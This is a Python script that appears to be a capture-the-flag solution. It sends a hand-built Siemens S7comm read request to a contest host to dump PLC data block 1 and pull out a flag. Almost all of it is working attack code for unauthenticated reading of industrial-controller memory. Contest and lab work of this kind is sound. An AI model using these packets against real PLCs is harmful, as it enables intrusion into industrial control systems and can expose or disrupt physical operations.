#!/usr/bin/env python3
import socket
import struct
import time
import sys

# Flush output immediately
sys.stdout.reconfigure(line_buffering=True)

HOST = "mnbvcxzqwertyui-csc26.cybersecuritychallenge.al"
PORT = 10023

def log(msg):
    print(msg)

def make_packet(db_num):
    # Valid S7 Read Request (DB{db_num}, Start 0, Size 256 bytes)
    # TPKT(4) + COTP(3) + S7(10) + Params(14) = 31 bytes
    
    tpkt_cotp = bytes([0x03, 0x00, 0x00, 0x1F, 0x02, 0xF0, 0x80])
    
    s7_head = bytes([
        0x32, 0x01, 
        0x00, 0x00, 
        0x00, 0x05, 
        0x00, 0x0E, 
        0x00, 0x00
    ])

    # Param: Func 0x04, Count 1
    # Item: 0x12, 0x0A, 0x10, 0x02 (Prefix)
    # Len: 256 (0x0100)
    # DB: db_num (2 bytes)
    # Area: 0x84
    # Addr: 0x000000 (3 bytes)
    
    args = (
        bytes([0x04, 0x01]) + 
        bytes([0x12, 0x0A, 0x10, 0x02]) + 
        struct.pack(">H", 64) + 
        struct.pack(">H", db_num) + 
        bytes([0x84]) + 
        bytes([0x00, 0x00, 0x00])
    )
    
    return tpkt_cotp + s7_head + args

def main():
    log("[*] Connecting...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5) # 5s timeout
        s.connect((HOST, PORT))
        log("[+] Connected!")
    except Exception as e:
        log(f"[-] Connect failed: {e}")
        return

    # COTP Handshake
    log("[*] Sending COTP...")
    cotp_req = bytes.fromhex("0300001611e00000000100c1020100c2020102c0010a")
    s.send(cotp_req)
    try:
        resp = s.recv(1024)
        log(f"[+] COTP Response: {resp.hex()}")
    except Exception as e:
        log(f"[-] COTP failed: {e}")
        # Proceed anyway?
    
    # Target DB 1 specifically
    db = 1
    read_len = 256
    
    # Update TPKT length (4+3+10+14 = 31 = 0x1F)
    tpkt_cotp = bytes([0x03, 0x00, 0x00, 0x1F, 0x02, 0xF0, 0x80])
    
    s7_head = bytes([
        0x32, 0x01, 
        0x00, 0x00, 
        0x00, 0x05, 
        0x00, 0x0E, 
        0x00, 0x00
    ])

    args = (
        bytes([0x04, 0x01]) + 
        bytes([0x12, 0x0A, 0x10, 0x02]) + 
        struct.pack(">H", read_len) + 
        struct.pack(">H", db) + 
        bytes([0x84]) + 
        bytes([0x00, 0x00, 0x00])
    )
    
    pkt = tpkt_cotp + s7_head + args
    
    try:
        s.send(pkt)
        s.settimeout(5)
        resp = s.recv(4096)
        
        if len(resp) > 0:
             log(f"\n[+] Received {len(resp)} bytes")
             log(f"Hex: {resp.hex()}")
             
             # S7 Data starts after headers (approx 25 bytes)
             data = resp[25:] if len(resp) > 25 else resp
             txt = "".join([chr(b) if 32 <= b <= 126 else "." for b in resp])
             log(f"Cleaned String: {txt}")
             
             if "CSC26" in txt:
                 start = txt.find("CSC26")
                 # Extract flag-like string (alphabet + hex + symbols)
                 flag_part = "".join([c for c in txt[start:] if c.isalnum() or c in "{}"])
                 log(f"\n[!] POTENTIAL FLAG: {flag_part}")
             
             return
    except Exception as e:
        log(f"Error reading DB 1: {e}")
        
    log("[*] Done.")
    s.close()

if __name__ == "__main__":
    main()

